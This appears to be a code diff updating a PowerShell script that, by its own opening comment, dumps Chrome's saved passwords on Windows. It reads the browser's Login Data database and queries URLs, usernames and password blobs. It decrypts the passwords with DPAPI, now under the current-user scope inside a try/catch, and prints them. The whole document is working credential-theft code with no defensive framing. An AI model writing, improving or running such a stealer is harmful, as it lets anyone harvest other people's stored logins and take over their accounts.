@@ -1,6 +1,6 @@
 # Assuming Win 10 with Chrome installed, dump the saved passwords...
-$path="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Default\\Login Data"
-$query = "SELECT action_url, username_value, password_value FROM logins"
+$dataPath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Default\\Login Data"
+$query = "SELECT origin_url, username_value, password_value FROM logins"
 
 Add-Type -AssemblyName System.Security
 Add-Type @"
@@ -54,7 +54,7 @@ Add-Type @"
 "@
 
 $dbH = 0
-if([WinSQLite3]::Open($path, [ref] $dbH) -ne 0) {
+if([WinSQLite3]::Open($dataPath, [ref] $dbH) -ne 0) {
     Write-Host "Failed to open!"
     [WinSQLite3]::GetErrmsg($dbh)
     exit
@@ -68,12 +68,26 @@ if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) -ne 
 }
 
 while([WinSQLite3]::Step($stmt) -eq 100) {
+
     $url = [WinSQLite3]::ColumnString($stmt, 0)
     $u = [WinSQLite3]::ColumnString($stmt, 1)
-    $p = [System.Text.Encoding]::ASCII.GetString(
-        [System.Security.Cryptography.ProtectedData]::Unprotect(
-            [WinSQLite3]::ColumnByteArray($stmt, 2),
-            $null,
-            [Security.Cryptography.DataProtectionScope]::LocalMachine))
+    $p = $null
+
+    try {
+
+        # Passwords created before installing Chrome v80, decrypted using
+        # DPAPI.
+        $p = [System.Text.Encoding]::ASCII.GetString(
+            [System.Security.Cryptography.ProtectedData]::Unprotect(
+                [WinSQLite3]::ColumnByteArray($stmt, 2),
+                $null,
+                [Security.Cryptography.DataProtectionScope]::CurrentUser
+            )
+        )
+
+    } catch [System.Security.Cryptography.CryptographicException] {
+    }
+
+
     Write-Host "$url,$u,$p"
 }
